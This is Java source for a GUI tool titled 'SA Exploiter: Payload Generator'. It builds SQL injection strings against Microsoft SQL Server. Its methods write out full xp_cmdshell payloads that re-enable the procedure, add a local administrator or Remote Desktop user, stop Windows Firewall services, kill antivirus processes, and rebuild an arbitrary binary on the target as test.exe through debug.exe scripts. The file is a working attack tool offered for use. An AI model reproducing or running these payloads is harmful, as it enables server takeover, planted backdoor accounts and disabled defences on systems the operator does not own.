import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.ClipboardOwner;
import java.awt.datatransfer.StringSelection;
import java.awt.datatransfer.Transferable;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import javax.swing.JFileChooser;
import javax.swing.UIManager;

public class Main extends javax.swing.JFrame implements ClipboardOwner {

    /** Creates new form Main */
    public Main() {
        initComponents();
    }

    /** This method is called from within the constructor to
     * initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is
     * always regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        buttonGroup1 = new javax.swing.ButtonGroup();
        jTabbedPane1 = new javax.swing.JTabbedPane();
        jPanelGenerator = new javax.swing.JPanel();
        jScrollPane2 = new javax.swing.JScrollPane();
        jTextAreaSQL = new javax.swing.JTextArea();
        jButtonGenerate = new javax.swing.JButton();
        jButtonCopyClipboard = new javax.swing.JButton();
        jPanelGeneric = new javax.swing.JPanel();
        jRadioButtonBinary = new javax.swing.JRadioButton();
        jRadioButtonXpEnable = new javax.swing.JRadioButton();
        jRadioButtonDisableVirus = new javax.swing.JRadioButton();
        jRadioButtonDisableFirewall = new javax.swing.JRadioButton();
        jRadioButton1 = new javax.swing.JRadioButton();
        jPanelUser = new javax.swing.JPanel();
        jRadioButtonAddUser = new javax.swing.JRadioButton();
        jTextFieldUsername = new javax.swing.JTextField();
        jTextFieldPassword = new javax.swing.JTextField();
        jCheckBoxLocalAdmin = new javax.swing.JCheckBox();
        jCheckBoxRemoteDesktop = new javax.swing.JCheckBox();
        jPanelHexDump = new javax.swing.JPanel();
        jButtonLoadFile = new javax.swing.JButton();
        jScrollPane1 = new javax.swing.JScrollPane();
        jTextAreaHexDump = new javax.swing.JTextArea();
        jPanelAbout = new javax.swing.JPanel();
        jPanel1 = new javax.swing.JPanel();
        jLabel1 = new javax.swing.JLabel();
        jLabel2 = new javax.swing.JLabel();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setTitle("SA Exploiter: Payload Generator");
        setBounds(new java.awt.Rectangle(100, 100, 100, 100));
        setCursor(new java.awt.Cursor(java.awt.Cursor.CROSSHAIR_CURSOR));
        setResizable(false);

        jPanelGenerator.setBorder(javax.swing.BorderFactory.createEtchedBorder());

        jTextAreaSQL.setColumns(20);
        jTextAreaSQL.setFont(new java.awt.Font("Arial", 0, 12)); // NOI18N
        jTextAreaSQL.setLineWrap(true);
        jTextAreaSQL.setRows(5);
        jScrollPane2.setViewportView(jTextAreaSQL);

        jButtonGenerate.setText("Generate");
        jButtonGenerate.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButtonGenerateActionPerformed(evt);
            }
        });

        jButtonCopyClipboard.setText("Copy to clipboard");
        jButtonCopyClipboard.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButtonCopyClipboardActionPerformed(evt);
            }
        });

        jPanelGeneric.setBorder(javax.swing.BorderFactory.createTitledBorder("Generic"));

        buttonGroup1.add(jRadioButtonBinary);
        jRadioButtonBinary.setText("Use Binary Payload");

        buttonGroup1.add(jRadioButtonXpEnable);
        jRadioButtonXpEnable.setText("Enable xp_cmdshell");

        buttonGroup1.add(jRadioButtonDisableVirus);
        jRadioButtonDisableVirus.setText("Disable AntiVirus");
        jRadioButtonDisableVirus.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jRadioButtonDisableVirusActionPerformed(evt);
            }
        });

        buttonGroup1.add(jRadioButtonDisableFirewall);
        jRadioButtonDisableFirewall.setText("Disable Firewall");

        buttonGroup1.add(jRadioButton1);
        jRadioButton1.setText("Raw Binary Payload");

        javax.swing.GroupLayout jPanelGenericLayout = new javax.swing.GroupLayout(jPanelGeneric);
        jPanelGeneric.setLayout(jPanelGenericLayout);
        jPanelGenericLayout.setHorizontalGroup(
            jPanelGenericLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanelGenericLayout.createSequentialGroup()
                .addGroup(jPanelGenericLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jRadioButtonBinary)
                    .addComponent(jRadioButton1)
                    .addComponent(jRadioButtonXpEnable)
                    .addComponent(jRadioButtonDisableFirewall)
                    .addComponent(jRadioButtonDisableVirus))
                .addContainerGap(63, Short.MAX_VALUE))
        );
        jPanelGenericLayout.setVerticalGroup(
            jPanelGenericLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanelGenericLayout.createSequentialGroup()
                .addComponent(jRadioButtonBinary)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jRadioButton1)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jRadioButtonXpEnable)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jRadioButtonDisableVirus)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addComponent(jRadioButtonDisableFirewall))
        );

        jPanelUser.setBorder(javax.swing.BorderFactory.createTitledBorder("User"));

        buttonGroup1.add(jRadioButtonAddUser);
        jRadioButtonAddUser.setText("Add Local User");

        jTextFieldUsername.setText("username");

        jTextFieldPassword.setText("password");

        jCheckBoxLocalAdmin.setText("Local Admin");

        jCheckBoxRemoteDesktop.setText("Remote Desktop");

        javax.swing.GroupLayout jPanelUserLayout = new javax.swing.GroupLayout(jPanelUser);
        jPanelUser.setLayout(jPanelUserLayout);
        jPanelUserLayout.setHorizontalGroup(
            jPanelUserLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanelUserLayout.createSequentialGroup()
                .addGroup(jPanelUserLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false)
                    .addComponent(jTextFieldUsername, javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jRadioButtonAddUser, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addComponent(jTextFieldPassword, javax.swing.GroupLayout.DEFAULT_SIZE, 96, Short.MAX_VALUE))
            .addGroup(jPanelUserLayout.createSequentialGroup()
                .addComponent(jCheckBoxLocalAdmin)
                .addContainerGap())
            .addGroup(jPanelUserLayout.createSequentialGroup()
                .addComponent(jCheckBoxRemoteDesktop)
                .addContainerGap())
        );
        jPanelUserLayout.setVerticalGroup(
            jPanelUserLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanelUserLayout.createSequentialGroup()
                .addComponent(jRadioButtonAddUser)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(jPanelUserLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jTextFieldUsername, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jTextFieldPassword, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addComponent(jCheckBoxLocalAdmin)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jCheckBoxRemoteDesktop)
                .addContainerGap(12, Short.MAX_VALUE))
        );

        javax.swing.GroupLayout jPanelGeneratorLayout = new javax.swing.GroupLayout(jPanelGenerator);
        jPanelGenerator.setLayout(jPanelGeneratorLayout);
        jPanelGeneratorLayout.setHorizontalGroup(
            jPanelGeneratorLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanelGeneratorLayout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanelGeneratorLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jScrollPane2, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, 702, Short.MAX_VALUE)
                    .addGroup(jPanelGeneratorLayout.createSequentialGroup()
                        .addGroup(jPanelGeneratorLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false)
                            .addComponent(jPanelGeneric, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                            .addGroup(javax.swing.GroupLayout.Alignment.LEADING, jPanelGeneratorLayout.createSequentialGroup()
                                .addComponent(jButtonGenerate)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                .addComponent(jButtonCopyClipboard)))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jPanelUser, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addContainerGap())
        );
        jPanelGeneratorLayout.setVerticalGroup(
            jPanelGeneratorLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanelGeneratorLayout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanelGeneratorLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jButtonGenerate)
                    .addComponent(jButtonCopyClipboard))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(jPanelGeneratorLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jPanelGeneric, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jPanelUser, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jScrollPane2, javax.swing.GroupLayout.DEFAULT_SIZE, 343, Short.MAX_VALUE)
                .addContainerGap())
        );

        jTabbedPane1.addTab("Generator", jPanelGenerator);

        jPanelHexDump.setBorder(javax.swing.BorderFactory.createEtchedBorder());

        jButtonLoadFile.setText("Load File...");
        jButtonLoadFile.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButtonLoadFileActionPerformed(evt);
            }
        });

        jTextAreaHexDump.setColumns(20);
        jTextAreaHexDump.setFont(new java.awt.Font("Arial", 0, 10));
        jTextAreaHexDump.setLineWrap(true);
        jTextAreaHexDump.setRows(5);
        jScrollPane1.setViewportView(jTextAreaHexDump);

        javax.swing.GroupLayout jPanelHexDumpLayout = new javax.swing.GroupLayout(jPanelHexDump);
        jPanelHexDump.setLayout(jPanelHexDumpLayout);
        jPanelHexDumpLayout.setHorizontalGroup(
            jPanelHexDumpLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanelHexDumpLayout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanelHexDumpLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 702, Short.MAX_VALUE)
                    .addComponent(jButtonLoadFile, javax.swing.GroupLayout.PREFERRED_SIZE, 97, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addContainerGap())
        );
        jPanelHexDumpLayout.setVerticalGroup(
            jPanelHexDumpLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanelHexDumpLayout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jButtonLoadFile)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 494, Short.MAX_VALUE)
                .addContainerGap())
        );

        jTabbedPane1.addTab("HexDump", jPanelHexDump);

        jPanel1.setBorder(javax.swing.BorderFactory.createEtchedBorder());

        jLabel1.setText("SA Exploiter V0.1 - Myles Hosford");

        jLabel2.setText("18/05/2010");

        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);
        jPanel1.setLayout(jPanel1Layout);
        jPanel1Layout.setHorizontalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel1Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jLabel1)
                    .addComponent(jLabel2))
                .addContainerGap(275, Short.MAX_VALUE))
        );
        jPanel1Layout.setVerticalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel1Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jLabel1)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jLabel2)
                .addContainerGap(107, Short.MAX_VALUE))
        );

        javax.swing.GroupLayout jPanelAboutLayout = new javax.swing.GroupLayout(jPanelAbout);
        jPanelAbout.setLayout(jPanelAboutLayout);
        jPanelAboutLayout.setHorizontalGroup(
            jPanelAboutLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanelAboutLayout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jPanel1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(266, Short.MAX_VALUE))
        );
        jPanelAboutLayout.setVerticalGroup(
            jPanelAboutLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanelAboutLayout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jPanel1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(382, Short.MAX_VALUE))
        );

        jTabbedPane1.addTab("About", jPanelAbout);

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jTabbedPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 731, Short.MAX_VALUE)
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jTabbedPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 577, Short.MAX_VALUE)
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void jButtonLoadFileActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButtonLoadFileActionPerformed
        jTextAreaHexDump.setText("");
        fc.showOpenDialog(this);
        File file = fc.getSelectedFile();
        try {
            jTextAreaHexDump.append(toHexString(getBytesFromFile(file)));
        } catch (Exception e) {
            System.out.println("Error 2: " + e);
        }
}//GEN-LAST:event_jButtonLoadFileActionPerformed

    private void jButtonGenerateActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButtonGenerateActionPerformed
        try {
            if (jRadioButton1.isSelected()) {
            if (jTextAreaHexDump.getText().equals("")) {
                    jTextAreaSQL.setText("Use Hex Dump To Select Binary");
                } else {
                   buttonRawBinary();
                }
            }
            if (jRadioButtonAddUser.isSelected()) {
                buttonAddUser();
            }
            if (jRadioButtonBinary.isSelected()) {
                if (jTextAreaHexDump.getText().equals("")) {
                    jTextAreaSQL.setText("Use Hex Dump To Select Binary");
                } else {
                   buttonBinary();
                }
            }
            if (jRadioButtonDisableFirewall.isSelected()) {
                buttonFirewall();
            }
            if (jRadioButtonDisableVirus.isSelected()) {
                buttonVirus();
            }
            if (jRadioButtonXpEnable.isSelected()) {
                buttonXpEnable();
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }//GEN-LAST:event_jButtonGenerateActionPerformed

    public void buttonAddUser() {
        String username = jTextFieldUsername.getText().trim();
        String password = jTextFieldPassword.getText().trim();
        String userSql = ";exec master..xp_cmdshell 'net user " + username + " " + password + " /add';";
        String adminSql = " exec master..xp_cmdshell 'net localgroup administrators " + username + " /add';";
        String remoteDSql = " exec master..xp_cmdshell 'net localgroup \"Remote Desktop Users\" " + username + " /add';";
        String finalString = userSql;
        if (jCheckBoxLocalAdmin.isSelected()) {
            finalString = finalString + adminSql;
        }
        if (jCheckBoxRemoteDesktop.isSelected()) {
            finalString = finalString + remoteDSql;
        }
        String end = "--";
        finalString = finalString + end;      
        jTextAreaSQL.setText(finalString);
    }

    public void buttonRawBinary() {
        jTextAreaSQL.setText("");
        String payload = jTextAreaHexDump.getText();
        int bytes = payload.length() /2;
        int lines = bytes / 16;
        int remainder = bytes % 16;
        if (remainder > 0) {
            lines = lines +1;
        }

        int total =0;
        jTextAreaSQL.append("n test.bin\n");
        int startSub = -32;
        int endSub = 0;
        int currentLine = 0;
        for (int i=0; i<lines*16; i=i+16) {
            currentLine++;
            if (currentLine == lines) {
                startSub = startSub + 32;
                endSub = endSub + remainder*2;
                String unprocessedSubString = payload.substring(startSub, endSub);
                String processedString = "";
                for(int y = 0; y < unprocessedSubString.length(); y = y+2) {
                    processedString = processedString + unprocessedSubString.substring(y, y+2) + " ";
                }
                jTextAreaSQL.append("e " + Integer.toHexString(i) + " "+ processedString + "\n");
                
            } else {
                startSub = startSub + 32;
                endSub = endSub + 32;
                String unprocessedSubString = payload.substring(startSub, endSub);
                String processedString = "";
                for(int y = 0; y < unprocessedSubString.length(); y = y+2) {
                    processedString = processedString + unprocessedSubString.substring(y, y+2) + " ";
                }
                jTextAreaSQL.append("e " + Integer.toHexString(i) + " "+ processedString + "\n");
                
                
            }
            
            total = i;
        }
        total = total + remainder;
        jTextAreaSQL.append("rcx\n");
        jTextAreaSQL.append(Integer.toHexString(total) + "\n");
        jTextAreaSQL.append("w 0\n");
        jTextAreaSQL.append("q\n");       
    }

    public void buttonBinary() {
        jTextAreaSQL.setText("");
        String payload = jTextAreaHexDump.getText();
        int bytes = payload.length() /2;
        int lines = bytes / 16;
        int remainder = bytes % 16;
        if (remainder > 0) {
            lines = lines +1;
        }

        int total =0;
        jTextAreaSQL.append("; exec master..xp_cmdshell 'echo n test.bin > test.scr'");
        int startSub = -32;
        int endSub = 0;
        int currentLine = 0;
        for (int i=0; i<lines*16; i=i+16) {
            currentLine++;
            if (currentLine == lines) {
                startSub = startSub + 32;
                endSub = endSub + remainder*2;
                String unprocessedSubString = payload.substring(startSub, endSub);
                String processedString = "";
                for(int y = 0; y < unprocessedSubString.length(); y = y+2) {
                    processedString = processedString + unprocessedSubString.substring(y, y+2) + " ";
                }
                    jTextAreaSQL.append("; exec master..xp_cmdshell 'echo e " + Integer.toHexString(i) + " "+ processedString + " >> test.scr'");
            } else {
                startSub = startSub + 32;
                endSub = endSub + 32;
                String unprocessedSubString = payload.substring(startSub, endSub);
                String processedString = "";
                for(int y = 0; y < unprocessedSubString.length(); y = y+2) {
                    processedString = processedString + unprocessedSubString.substring(y, y+2) + " ";
                }
                jTextAreaSQL.append("; exec master..xp_cmdshell 'echo e " + Integer.toHexString(i) + " "+ processedString + " >> test.scr'");


            }

            total = i;
        }
        total = total + remainder;
        jTextAreaSQL.append("; exec master..xp_cmdshell 'echo rcx >> test.scr'");
        jTextAreaSQL.append("; exec master..xp_cmdshell 'echo " + Integer.toHexString(total) + " >> test.scr'");
        jTextAreaSQL.append("; exec master..xp_cmdshell 'echo w 0 >> test.scr'");
        jTextAreaSQL.append("; exec master..xp_cmdshell 'echo q >> test.scr'");
        jTextAreaSQL.append("; exec master..xp_cmdshell 'debug < test.scr'");
        jTextAreaSQL.append("; exec master..xp_cmdshell 'move test.bin test.exe'");
        jTextAreaSQL.append("; exec master..xp_cmdshell 'del test.scr';--");
    }
    public void buttonFirewall() {
        String firewall = "; exec master..xp_cmdshell 'NET STOP \"Windows Firewall\"'; exec master..xp_cmdshell 'NET STOP \"Internet Connection Firewall (ICF) / Internet Connection Sharing (ICS)\"'; exec master..xp_cmdshell 'NET STOP \"Windows Firewall/Internet Connection Sharing (ICS)\"'--";
        jTextAreaSQL.setText(firewall);
    }

    public void buttonVirus() {
        String virus = "; exec master..xp_cmdshell 'taskkill /F /IM avg*'; exec master..xp_cmdshell 'taskkill /F /IM ccapp.exe'; exec master..xp_cmdshell 'taskkill /F /IM cfgwiz.exe'; exec master..xp_cmdshell 'taskkill /F /IM nmain.exe' ;exec master..xp_cmdshell 'taskkill /F /IM nisum.exe' ;exec master..xp_cmdshell 'taskkill /F /IM navapsvc.exe'; exec master..xp_cmdshell 'net stop \"Norton AntiVirus Auto Protect Service\"' ; exec master..xp_cmdshell 'net stop \"Norton Unerase Protection\"'; exec master..xp_cmdshell 'net stop \"Symantec Core LC\"'; exec master..xp_cmdshell 'net stop \"Symantec Event Manager\"'; exec master..xp_cmdshell 'net stop \"Symantec Network Drivers Service\"' ;exec master..xp_cmdshell 'net stop \"Symantec Network Proxy\"'--";
        jTextAreaSQL.setText(virus);
    }

    public void buttonXpEnable() {
        String sqlString = "; exec master..sp_addextendedproc \"xp_cmdshell\", \"C:\\Program Files\\Microsoft SQL Server\\MSSQL\\Binn\\xplog70.dll\" ;exec master..sp_configure \"show advanced options\", 1 ;RECONFIGURE ;exec master..sp_configure \"xp_cmdshell\", 1 ;RECONFIGURE--";
        jTextAreaSQL.setText(sqlString);
    }

    private void jButtonCopyClipboardActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButtonCopyClipboardActionPerformed
        StringSelection stringSelection = new StringSelection(jTextAreaSQL.getText());
        Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
        clipboard.setContents( stringSelection,this);


    }//GEN-LAST:event_jButtonCopyClipboardActionPerformed

    private void jRadioButtonDisableVirusActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jRadioButtonDisableVirusActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_jRadioButtonDisableVirusActionPerformed
        public static byte[] getBytesFromFile(File file) throws IOException {
        InputStream is = new FileInputStream(file);

        // Get the size of the file
        long length = file.length();

       if (length > Integer.MAX_VALUE) {
            System.out.println("File too large.");
        }

        // Create the byte array to hold the data
        byte[] bytes = new byte[(int)length];

        // Read in the bytes
        int offset = 0;
        int numRead = 0;
        while (offset < bytes.length
               && (numRead=is.read(bytes, offset, bytes.length-offset)) >= 0) {
            offset += numRead;
        }

        // Ensure all the bytes have been read in
        if (offset < bytes.length) {
            throw new IOException("Could not completely read file " + file.getName());
        }

        // Close the input stream and return bytes
        is.close();
        return bytes;
    }

    public static String toHexString(byte[] block) {
        StringBuffer buf = new StringBuffer();
        char[] hexChars = {
            '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
            'A', 'B', 'C', 'D', 'E', 'F' };
        int len = block.length;
        int high = 0;
        int low = 0;
        for (int i = 0; i < len; i++) {
            high = ((block[i] & 0xf0) >> 4);
            low = (block[i] & 0x0f);
            buf.append(hexChars[high]);
            buf.append(hexChars[low]);
        }
        return buf.toString();
    }
    /**
    * @param args the command line arguments
    */
    public static void main(String args[]) {
        try {
            UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
        } catch (Exception e) {
        }
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new Main().setVisible(true);
            }
        });
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.ButtonGroup buttonGroup1;
    private javax.swing.JButton jButtonCopyClipboard;
    private javax.swing.JButton jButtonGenerate;
    private javax.swing.JButton jButtonLoadFile;
    private javax.swing.JCheckBox jCheckBoxLocalAdmin;
    private javax.swing.JCheckBox jCheckBoxRemoteDesktop;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JPanel jPanel1;
    private javax.swing.JPanel jPanelAbout;
    private javax.swing.JPanel jPanelGenerator;
    private javax.swing.JPanel jPanelGeneric;
    private javax.swing.JPanel jPanelHexDump;
    private javax.swing.JPanel jPanelUser;
    private javax.swing.JRadioButton jRadioButton1;
    private javax.swing.JRadioButton jRadioButtonAddUser;
    private javax.swing.JRadioButton jRadioButtonBinary;
    private javax.swing.JRadioButton jRadioButtonDisableFirewall;
    private javax.swing.JRadioButton jRadioButtonDisableVirus;
    private javax.swing.JRadioButton jRadioButtonXpEnable;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JScrollPane jScrollPane2;
    private javax.swing.JTabbedPane jTabbedPane1;
    private javax.swing.JTextArea jTextAreaHexDump;
    private javax.swing.JTextArea jTextAreaSQL;
    private javax.swing.JTextField jTextFieldPassword;
    private javax.swing.JTextField jTextFieldUsername;
    // End of variables declaration//GEN-END:variables
    JFileChooser fc = new JFileChooser();

    public void lostOwnership(Clipboard clipboard, Transferable contents) {
        throw new UnsupportedOperationException("Not supported yet.");
    }
}
